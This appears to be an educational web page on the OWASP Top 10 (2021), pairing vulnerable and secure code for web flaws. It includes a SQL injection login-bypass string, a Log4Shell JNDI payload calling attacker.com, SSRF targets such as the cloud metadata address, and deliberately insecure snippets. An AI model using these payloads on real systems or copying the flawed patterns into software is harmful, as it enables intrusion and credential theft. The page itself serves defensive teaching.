OWASP A01:2021
Broken Access Control
CRITICAL 94% of apps tested
What Is It?

Access control enforces that users can only act within their intended permissions. When this fails, attackers can access unauthorized data, functions, or accounts — often simply by changing a URL parameter or ID.

🏨 Hotel Analogy

You're given Room 101's keycard but use it to enter Room 501 (the CEO suite) because the hotel forgot to restrict access. The lock exists — it just doesn't check who should enter.

Real-World Example

An e-commerce app shows order details at /orders/1042. An attacker changes the ID to /orders/1001 and reads another user's purchase history — credit card last 4, address, items ordered.

Why It Happens

Developers assume users won't manually change IDs. No server-side check verifies that the requesting user actually owns the resource. Client-side hiding of admin buttons is not access control.

Code Examples
⛔ VULNERABLE — Node.js/Express
app.get('/api/user/:id', async (req, res) => { // ❌ No ownership check! const user = await User.findById(req.params.id); res.json(user); // Returns ANY user's data });
✅ SECURE — Node.js/Express
app.get('/api/user/:id', authenticate, async (req, res) => { // ✅ Verify ownership if (req.user.id !== req.params.id && !req.user.hasRole('admin')) { return res.status(403).json({error:'Forbidden'}); } const user = await User.findById(req.params.id); res.json(user); });
Prevention Checklist
  • Deny access by default — explicitly grant permissions, never implicitly
  • Implement server-side ownership checks for every resource request
  • Use role-based access control (RBAC) or attribute-based (ABAC)
  • Log access control failures and alert on suspicious patterns
  • Invalidate JWT tokens on logout — use short-lived tokens

Cryptographic Failures
CRITICAL Formerly: Sensitive Data Exposure
What Is It?

Failures related to cryptography (or its absence) often lead to exposure of sensitive data — passwords, credit cards, health records. Using weak algorithms, no encryption, or improper key storage are common causes.

📮 Postcard Analogy

Sending passwords in plain text is like writing your bank PIN on a postcard — every postal worker (network hop) can read it. Encryption is the sealed envelope that only the recipient can open.

Real-World Example

2012 LinkedIn Breach: 6.5 million SHA-1 hashed passwords (no salt) were dumped. Attackers cracked 90%+ using rainbow tables within days. Users with "password123" were instantly exposed.

Code Examples
⛔ VULNERABLE — Java
// ❌ Plain MD5, no salt String hash = DigestUtils.md5Hex(password); db.save("INSERT INTO users(pwd) VALUES(?)", hash); // ❌ HTTP instead of HTTPS String url = "http://api.example.com/pay"; // ❌ Hardcoded secret key String key = "secretkey123";
✅ SECURE — Java/Spring
// ✅ BCrypt with cost factor 12 BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12); String hash = encoder.encode(password); // ✅ Force HTTPS in Spring Security http.requiresChannel() .anyRequest().requiresSecure(); // ✅ Key from environment variable String key = System.getenv("SECRET_KEY");
Prevention Checklist
  • Use bcrypt, Argon2, or scrypt for password hashing — never MD5/SHA-1
  • Enforce TLS 1.2+ everywhere; disable old protocols (SSLv3, TLS 1.0)
  • Never hardcode secrets — use environment variables or secrets managers
  • Encrypt sensitive data at rest using AES-256-GCM
  • Always use authenticated encryption — never roll your own crypto

Injection
CRITICAL SQL · XSS · Command · LDAP
What Is It?

Injection occurs when untrusted data is sent to an interpreter as part of a command or query. SQL Injection is the most famous, but OS command injection, LDAP injection, and NoSQL injection are equally dangerous.

📝 Exam Paper Analogy

Imagine an exam where "Write your name: ___". A hacker writes: "John. Also grade me 100% and delete everyone else's answers." If the teacher follows all written instructions blindly — that's injection.

Real-World Example

Heartland Payment Systems (2008): SQL injection compromised 130 million credit card records — the largest breach at the time. A single vulnerable input field led to malware installation on the entire payment network.

Common Injection Types
  • 💾 SQL Injection — Manipulates database queries
  • 📜 XSS (Cross-Site Scripting) — Injects client-side scripts
  • 💻 OS Command Injection — Executes system commands
  • 🗂️ LDAP Injection — Manipulates directory queries
Step-by-Step Attack Flow

Finds input field

Code Examples
⛔ VULNERABLE — Node.js + MySQL
// ❌ String concatenation — NEVER do this const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; db.query(query, (err, results) => { // Attacker input: admin' OR '1'='1 // Becomes: WHERE username = 'admin' OR '1'='1' // ⚡ Logs in as admin without password! });
✅ SECURE — Parameterized Query
// ✅ Parameterized queries — values never // interpreted as SQL syntax const query = 'SELECT * FROM users WHERE username = ? AND password = ?'; db.query(query, [username, password], (err, results) => { // Attacker input: admin' OR '1'='1 // Treated as literal string — not SQL! // ✅ Returns 0 results — login fails }); // Spring Boot (Java) — use JPA/JPQL @Query("SELECT u FROM User u WHERE u.name = :name") findByName(@Param("name") String name);
Prevention Checklist
  • Use parameterized queries or prepared statements — always, no exceptions
  • Use an ORM (Hibernate, Sequelize, Prisma) — prefer named parameters
  • Validate and sanitize all input — whitelist approach over blacklist
  • Apply least privilege to database accounts — no DROP/ALTER in app DB user
  • Use a WAF (Web Application Firewall) as an additional layer of defense

OWASP A04:2021
Insecure Design
HIGH New in 2021
What Is It?

Insecure design represents flaws in the architecture and design phase — before a single line of code is written. It's not about implementation bugs; it's about missing or ineffective security controls that were never designed in from the start.

🏗️ Building Blueprint Analogy

A bank designed without a vault room can't have security added later just by painting a wall. If the blueprint never included a security door, you can't patch your way to safety — you need to redesign. Security must be designed in, not bolted on.

Real-World Example

Password Reset Design Flaw: A system allows unlimited reset attempts with a 4-digit OTP sent via SMS. An attacker can brute-force all 10,000 combinations (0000–9999) since there's no rate limiting — a design oversight, not a code bug.

Why It Differs from Other Vulns

Other vulnerabilities are implementation errors you can patch. Insecure design is a conceptual error. You can't fix a missing rate limit with a security patch if the architecture was never designed to track attempts. Requires redesign.

Secure Design Patterns
⛔ INSECURE DESIGN
// ❌ No rate limiting designed in // ❌ Short OTP (4 digits = 10000 combos) // ❌ OTP valid for 24 hours // ❌ No account lockout // ❌ OTP sent in URL (logs exposure) app.post('/reset', (req, res) => { const otp = Math.floor(Math.random() * 9999); // Stored without expiry, no attempt limit db.save({otp, userId: req.body.userId}); });
✅ SECURE DESIGN
// ✅ Rate limit: 3 attempts / 15 min // ✅ Long cryptographic token (32 bytes) // ✅ OTP expires in 10 minutes // ✅ Single use — invalidated after use // ✅ Token sent in POST body, not URL const token = crypto.randomBytes(32).toString('hex'); const expiry = Date.now() + 10 * 60 * 1000; db.save({token, userId, expiry, used: false}); // Apply: rateLimit(3 attempts/15min)
Prevention Checklist
  • Apply threat modeling during design phase (STRIDE / PASTA frameworks)
  • Use secure design patterns — defense in depth, fail secure, least privilege
  • Implement rate limiting and account lockout from day one
  • Use cryptographically secure random tokens, not short numeric OTPs
  • Conduct security design reviews before implementation begins

Security Misconfiguration
HIGH 90% of apps have misconfigs
What Is It?

Security misconfiguration is the most commonly seen vulnerability. It includes default credentials left unchanged, unnecessary features enabled, error messages revealing stack traces, S3 buckets left public, or missing security headers.

🏠 Smart Home Analogy

You install a smart lock with admin/admin as the default password and never change it. The manufacturer documented this default — any attacker can Google it. Having a smart lock is useless if the combination is "1234".

Common Misconfigurations
  • 🔑 Default passwords: admin/admin, root/root, admin/password
  • 📦 Public S3/Azure Blob buckets with sensitive files
  • ⚠️ Stack traces exposed in production error pages
  • 🔓 Directory listing enabled on web servers
  • 📡 Swagger/OpenAPI docs exposed publicly in production
  • 🗃️ Phpmyadmin/Kibana accessible from the internet

Code Examples
⛔ VULNERABLE — Spring Boot
## application.properties (INSECURE) # ❌ Debug mode in production spring.jpa.show-sql=true server.error.include-stacktrace=always # ❌ Actuator exposed to public management.endpoints.web.exposure.include=* # ❌ H2 console public spring.h2.console.enabled=true
✅ SECURE — Spring Boot
## application-prod.properties # ✅ No SQL logging spring.jpa.show-sql=false server.error.include-stacktrace=never # ✅ Only health endpoint exposed management.endpoints.web.exposure.include=health # ✅ H2 console disabled in prod spring.h2.console.enabled=false # ✅ Security headers configured
Prevention Checklist
  • Change all default credentials immediately after installation
  • Remove or disable all features and services not in use
  • Set all required security headers (CSP, HSTS, X-Frame-Options)
  • Never display detailed error messages or stack traces in production
  • Use Infrastructure as Code (IaC) scanning — Checkov, tfsec

OWASP A06:2021
Vulnerable and Outdated Components
HIGH Supply Chain Risk
What Is It?

Using libraries, frameworks, or other software components with known vulnerabilities. If you use a component with a known CVE — and attackers know which CVE affects your version — they can exploit it without any custom attack development.

🏚️ Old Lock Analogy

You bought a house and kept the original 1970s lock. Locksmiths published a guide showing how to open this lock model with a bent hairpin. Your house has a known, publicly documented vulnerability. The fix is to replace the lock — update the component.

⚡ INTERACTIVE DEMO — Dependency Vulnerability Scanner

Simulate a package.json scan. See which dependencies have known CVEs.

Real-World Example

Log4Shell (CVE-2021-44228): A critical 10.0/10 CVSS RCE vulnerability in Apache Log4j used by millions of apps. A single log message with ${jndi:ldap://attacker.com/exploit} could execute arbitrary code on any vulnerable server.

Other Famous Examples
  • Log4Shell — Apache Log4j 2.x (CVSS 10.0)
  • Equifax Breach — Apache Struts CVE-2017-5638
  • Heartbleed — OpenSSL 1.0.1 memory leak
  • SolarWinds — Malicious update supply chain
Code Examples
⛔ VULNERABLE — package.json
{ "dependencies": { // ❌ Pinned to vulnerable versions "log4j": "2.14.1", // CVE-2021-44228 "lodash": "4.17.15", // Prototype pollution "axios": "0.18.0", // SSRF vulnerability "express": "3.x" // EOL, many CVEs } }
✅ SECURE — Practices
{ "dependencies": { // ✅ Updated, patched versions "log4j": "2.17.2", // Patched "lodash": "4.17.21", // Patched "axios": "^1.6.0", // Latest "express": "^4.18.0" // Current LTS }, // ✅ Regular: npm audit, Snyk, Dependabot // ✅ SBOM (Software Bill of Materials) }
Prevention Checklist
  • Run npm audit, mvn dependency-check, or Snyk on every build
  • Enable Dependabot / Renovate for automated dependency updates
  • Maintain a Software Bill of Materials (SBOM) for all dependencies
  • Subscribe to CVE alerts for frameworks and libraries you use
  • Remove unused dependencies — smaller attack surface

OWASP A07:2021
Identification & Authentication Failures
HIGH Credential Stuffing · Brute Force
What Is It?

Weaknesses in authentication and session management allowing attackers to compromise passwords, keys, or session tokens — ultimately assuming another user's identity. Includes weak passwords, no MFA, session fixation, and credential stuffing.

🆔 ID Card Analogy

A club's bouncer only checks if you have any ID card, not if it's valid or yours. An attacker presents a fake or stolen ID — the system trusts the credential without properly verifying it. The identity check itself is broken.

⚡ INTERACTIVE DEMO — Credential Stuffing & Brute Force
Brute Force
Session Hijacking

No rate limiting or lockout. Common passwords tried automatically against admin account.

Predictable session tokens can be guessed or stolen from URL parameters.

User A session: PHPSESSID=12345 (sequential, predictable)
User B session: PHPSESSID=12346 (attacker guesses this)
Secure session: sess=a3f8b2e9d1c7k4m9p0q5r8s2t6u1v3w7x9y2z4 (32-byte crypto random)
Real-World Example

2023 Credential Stuffing Wave: Attackers used 3.2 billion leaked username/password pairs from previous breaches (combo lists) and automated login attempts across 500+ major sites. Users who reused passwords lost accounts instantly.

Common Auth Failures
  • 🔑 No MFA on admin/privileged accounts
  • 🔄 Passwords not invalidated on breach
  • 📝 Session IDs in URLs (appear in server logs)
  • ⏰ Sessions never expire — persistent forever
  • 🔓 Allows "password123" and "abc"
Code Examples
⛔ VULNERABLE — Session Management
// ❌ Sequential predictable session ID const sessionId = ++globalCounter; // ❌ Session in URL (logged by proxy) res.redirect(`/dashboard?sess=${sessionId}`); // ❌ No lockout after failed attempts if (password === stored) { login(); } // ❌ Session never expires req.session.cookie.maxAge = Infinity;
✅ SECURE — Session Management
// ✅ Cryptographically secure random ID const sessionId = crypto.randomBytes(32).toString('hex'); // ✅ Session in HttpOnly Secure cookie res.cookie('session', sessionId, { httpOnly: true, secure: true, sameSite: 'Strict' }); // ✅ Rate limit + lockout after 5 failures // ✅ Require MFA for admin roles // ✅ Session expires in 30min idle
Prevention Checklist
  • Enforce multi-factor authentication (MFA) — especially for privileged accounts
  • Implement rate limiting and account lockout after N failed attempts
  • Use cryptographically secure random session tokens (32+ bytes)
  • Check passwords against HaveIBeenPwned or similar breach databases
  • Expire sessions on logout and set appropriate idle timeouts

OWASP A08:2021
Software & Data Integrity Failures
HIGH CI/CD · Deserialization · Supply Chain
What Is It?

Failures to verify the integrity of software updates, data, or CI/CD pipelines. This includes insecure deserialization, unsigned software updates, and compromised build pipelines that allow malicious code to be deployed as part of legitimate software.

📦 Tampered Package Analogy

Imagine ordering medication online. A tampered package arrives — it looks legitimate but the pills inside have been switched. Without integrity verification (seal check, batch verification), you can't tell. Software updates without signatures are the same risk.

Real-World Example

SolarWinds Orion (2020): Attackers compromised the build pipeline and inserted malicious code into a signed, legitimate software update. 18,000+ organizations installed the backdoored update, including US government agencies. The code was signed — making it appear legitimate.

Attack Scenarios
  • 🏗️ Compromised CI/CD pipeline injects malware
  • 📦 Malicious npm/pip package (typosquatting)
  • 🔑 Insecure deserialization → RCE
  • 🔏 JWT alg:none signature bypass
Code Examples
⛔ VULNERABLE — JWT & Deserialize
// ❌ Accepts any algorithm including "none" jwt.verify(token, secret, { algorithms: ['HS256', 'none'] // NEVER! }); // ❌ Insecure Java deserialization ObjectInputStream ois = new ObjectInputStream( request.getInputStream() ); Object obj = ois.readObject(); // RCE risk!
✅ SECURE — JWT & Deserialization
// ✅ Whitelist only expected algorithms jwt.verify(token, secret, { algorithms: ['HS256'] // Only allow HS256 }); // ✅ Avoid Java deserialization of untrusted data // Use JSON (Jackson) instead: ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); // Also disable this! // Validate schema, use DTOs not raw Object
Prevention Checklist
  • Sign software updates and verify signatures before installation
  • Use dependency lock files (package-lock.json, yarn.lock) with integrity hashes
  • Implement CI/CD pipeline security — code review, signed commits, SAST scans
  • Never deserialize untrusted data — use JSON with schema validation instead
  • Explicitly whitelist JWT algorithms — never accept "none"

OWASP A09:2021
Security Logging & Monitoring Failures
MEDIUM Detection & Response Gap
What Is It?

Insufficient logging and monitoring means attacks go undetected. The average time to discover a breach is 287 days. Without logs, there's no evidence for forensics, no alerts for active attacks, and no way to understand what was compromised.

📹 CCTV Analogy

A bank with no security cameras. A robbery happens — police arrive but there's no footage, no record of who entered, what time, or what was taken. Logs are your CCTV system for your application. Without them, attacks succeed silently and go undetected for months.

⚡ INTERACTIVE DEMO — Live Attack Log Monitor

Simulate an attack. See the difference between no logging vs proper security logging.

What Should Be Logged
  • ✓ All login attempts (success + failure) with IP/timestamp
  • ✓ Access control failures and permission denials
  • ✓ Input validation failures with the attempted value
  • ✓ High-value transactions — payments, data exports
  • ✓ Admin actions — user creation, permission changes
Real-World Example

Equifax Breach (2017): Attackers had access for 78 days before detection. The network monitoring tool had an expired certificate — TLS inspection was disabled. 148 million records were exfiltrated. Proper logging and monitoring would have flagged the abnormal data egress within hours.

Code Examples
⛔ VULNERABLE — No Security Logging
// ❌ No logging of failures app.post('/login', (req, res) => { const user = db.find(req.body.username); if (!user || user.password !== hash) { return res.status(401).send('Bad credentials'); // ❌ Silently fails — no record } // ❌ No log of successful auth either res.send({token: generateToken(user)}); });
✅ SECURE — Structured Security Logging
// ✅ Log all auth events app.post('/login', (req, res) => { const user = db.find(req.body.username); if (!user || !verify(req.body.password, user.hash)) { logger.warn({ event: 'AUTH_FAILURE', ip: req.ip, username: req.body.username, timestamp: new Date().toISOString() }); return res.status(401).send('Invalid credentials'); } logger.info({event:'AUTH_SUCCESS', userId:user.id, ip:req.ip}); });
Prevention Checklist
  • Log all authentication events — success and failure — with IP and timestamp
  • Use structured logging (JSON) and centralize with SIEM (Splunk, ELK Stack)
  • Set up alerts for anomalous patterns — 50+ failed logins in 60 seconds
  • Protect log integrity — write-once storage, tamper detection
  • Never log sensitive data — passwords, tokens, credit card numbers

Server-Side Request Forgery (SSRF)
HIGH Cloud Metadata · Internal Network
What Is It?

SSRF allows an attacker to induce the server to make HTTP requests to an unintended location — bypassing firewalls to reach internal services. In cloud environments, attackers use SSRF to reach the metadata service at 169.254.169.254 and steal cloud credentials.

📮 Mail Room Analogy

You tell a bank employee: "Please fetch documents from this address for me." You give them your own company's internal vault address. The employee, trusted by the internal system, retrieves confidential documents — because the request came from inside. SSRF exploits trust relationships this way.

Real-World Example

Capital One Breach (2019): An SSRF vulnerability in a WAF configuration allowed an attacker to access the AWS EC2 metadata endpoint. They retrieved IAM credentials, then used those credentials to access 106 million customer records from S3 buckets. $80M+ in fines resulted.

Common SSRF Targets
  • 169.254.169.254 — AWS/GCP/Azure metadata
  • localhost:6379 — Redis (no auth by default)
  • localhost:9200 — Elasticsearch (open)
  • 10.0.0.0/8 — Internal microservices

Code Examples
⛔ VULNERABLE — Node.js URL Fetch
// ❌ Fetches any user-supplied URL app.get('/preview', async (req, res) => { const url = req.query.url; // ❌ No validation — attacker can reach // internal metadata, Redis, etc. const response = await fetch(url); const data = await response.text(); res.send(data); // Returns to attacker! });
✅ SECURE — SSRF Prevention
// ✅ Validate URL before fetching const ALLOWED_HOSTS = ['api.trusted.com', 'cdn.safe.io']; app.get('/preview', async (req, res) => { const url = new URL(req.query.url); // ✅ Allowlist check if (!ALLOWED_HOSTS.includes(url.hostname)) { return res.status(400).send('Domain not allowed'); } // ✅ Block private/loopback IPs // ✅ Disable redirects to other hosts // ✅ Use a dedicated egress proxy });
Prevention Checklist
  • Use an allowlist of domains — never a blocklist for SSRF prevention
  • Block requests to private IP ranges: 10.x.x.x, 172.16.x.x, 192.168.x.x, 169.254.x.x
  • Disable HTTP redirects or validate redirect targets against the allowlist
  • Use a dedicated egress proxy with strict egress firewall rules
  • In AWS: use IMDSv2 which requires a session-oriented token — SSRF can't get it
